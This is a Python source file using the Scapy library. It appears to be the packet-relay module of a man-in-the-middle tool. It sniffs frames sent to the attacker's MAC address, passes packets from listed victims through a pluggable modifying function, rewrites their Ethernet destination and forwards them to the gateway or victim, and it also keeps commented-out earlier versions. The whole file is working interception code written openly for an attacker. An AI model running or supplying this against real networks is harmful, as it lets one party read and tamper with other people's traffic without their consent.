from scapy.all import *
load_layer("http") 

import time
import threading
  
def check_packet(pkt, args):
    return pkt



# def read_packets(attacker, victim, function, options, packet_function_args):
#     print("[*] Sniffing packets for " + victim.ip + "...") if options.verbose else 0
#     while True:
#         pkt = sniff(count=1, iface=options.iface, filter="not arp and not icmp and ether dst "+attacker.mac+" and ip dst "+victim.ip)[0] # 
        
#         print("[+] Packet found for " + victim.ip)  if options.verbose else 0
#         print(pkt.summary())  if options.verbose else 0

#         pkt = function(pkt, packet_function_args)        

#         if (pkt[Ether].dst == attacker.mac):
#             # send packets to victim
#             pkt[Ether].dst = victim.mac
#             if(pkt.haslayer(IP)):
#                 pkt[IP].len = None
#                 pkt[IP].chksum = None
#             if(pkt.haslayer(TCP)):
#                 pkt[TCP].chksum = None

#         # print("[*] " + pkt.summary())
#         sendp(pkt, iface=options.iface, verbose=False)

# def read_other_packets(attacker, victims, function, options, packet_function_args):
#     while True:
#         ip_filter = ""
#         for victim in victims:
#             ip_filter += " and not ip dst " + victim.ip
#         pkt = sniff(count=1, iface=options.iface, filter="not arp and not icmp and ether dst "+attacker.mac+" and not ip dst "+attacker.ip+ip_filter)[0] #       

#         print("[+] Packet found")  if options.verbose else 0
#         print(pkt.summary())  if options.verbose else 0

#         pkt[Ether].dst = victim.mac

#         sendp(pkt, iface=options.iface, verbose=False)       


def read_packets(attacker, victims, gateway, function, options, packet_function_args):
    while True:
        pkt = sniff(count=1, iface=options.iface, filter="not arp and not icmp and ether dst "+attacker.mac)[0]
        print(attacker.ip)
        if (pkt.haslayer(IP) and pkt[IP].dst == attacker.ip):
             continue

        print("[+] Packet found from: ", pkt[Ether].src, " to: ", pkt[Ether].dst)  if options.verbose else 0
        if (pkt.haslayer(IP)):
            print("   IP from: ", pkt[IP].src, " to: ", pkt[IP].dst)  if options.verbose else 0


        mac = gateway.mac

        if (pkt.haslayer(IP)):
            for victim in victims:
                # print(victim.ip)
                if (pkt[IP].src == victim.ip):
                    mac = victim.mac

                    print("[+] Packet found for " + victim.ip)  if options.verbose else 0
                    print(pkt.summary())  if options.verbose else 0

                    pkt = function(pkt, packet_function_args)


        if (pkt[Ether].dst == attacker.mac):
            pkt[Ether].dst = mac

        sendp(pkt, iface=options.iface, verbose=False)

def main(function, victims, attacker, gateway, options, packet_function_args):
    
    # for victim in victims:
        # print victim ip
    print("[*] gateway " + gateway.ip + "..." + gateway.mac) if options.verbose else 0
    print("[*] attacker " + attacker.ip + "..." + attacker.mac) if options.verbose else 0
    threading.Thread(target=read_packets, args=(attacker, victims, gateway, function, options, packet_function_args), daemon=True).start()

    # threading.Thread(target=read_other_packets, args=(attacker, victims, function, options, packet_function_args), daemon=True).start()
    # wait for ctrl+c to exit application
    try: 
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        sys.exit(0) 















